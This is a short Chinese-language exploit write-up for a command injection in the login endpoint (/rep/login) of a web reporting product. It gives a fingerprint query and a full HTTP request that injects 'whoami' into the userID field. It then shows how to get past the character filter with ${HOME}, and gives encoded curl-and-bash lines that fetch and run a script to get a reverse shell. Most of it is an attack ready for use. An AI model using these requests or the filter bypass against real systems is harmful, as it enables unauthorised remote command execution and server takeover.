# 指纹特征
```
body="/report/templet/image/login-logo-text.png"
```

# 漏洞复现
```
POST /rep/login HTTP/1.1
Host: 127.0.0.1:85
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A536E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36  uacq
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 123

clsMode=cls_mode_login1&index=index&log_type=report&loginType=webui&page=login&rnd=0&userID=admin%0Awhoami%0A&userPsw=123
```

# 漏洞利用
测试发现过滤了如下字符
```
/
|
>
:
`
;
\
"
<
&
```
这样的话，没法写webshell、反弹shell

可以利用linux的环境变量${HOME}和${PWD}替代特殊字符/来反弹shell，反弹shell编码前
```
curl 127.0.0.1 -o /tmp/1.txt
bash /tmp/1.txt
```
编码后
```
curl%20127.0.0.1%20-o%20${HOME}tmp${HOME}1.txt
bash%20${HOME}tmp${HOME}1.txt
```
web目录（不确定是否通用）
```
/usr/web/wwwroot
```

# 参考链接
https://mp.weixin.qq.com/s/UbkQ9YvnIu8eN7nJgiXw4Q